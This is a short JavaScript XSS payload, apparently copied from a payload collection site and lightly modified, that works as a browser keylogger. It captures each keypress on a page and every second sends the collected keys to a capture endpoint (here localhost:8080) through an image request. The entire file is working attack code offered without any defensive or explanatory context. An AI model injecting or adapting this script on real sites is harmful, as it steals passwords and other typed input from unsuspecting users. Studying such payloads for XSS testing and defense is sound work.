// sourced from
// http://www.xss-payloads.com/payloads/scripts/simplekeylogger.js.html
// slightly modified

var keys = '';
document.onkeypress = function(e) {
      get = window.event?event:e;
        key = get.keyCode?get.keyCode:get.charCode;
          key = String.fromCharCode(key);
            keys+=key;
}
window.setInterval(function(){
      new Image().src = 'http://localhost:8080/capture/'+keys;
        keys = '';
}, 1000);
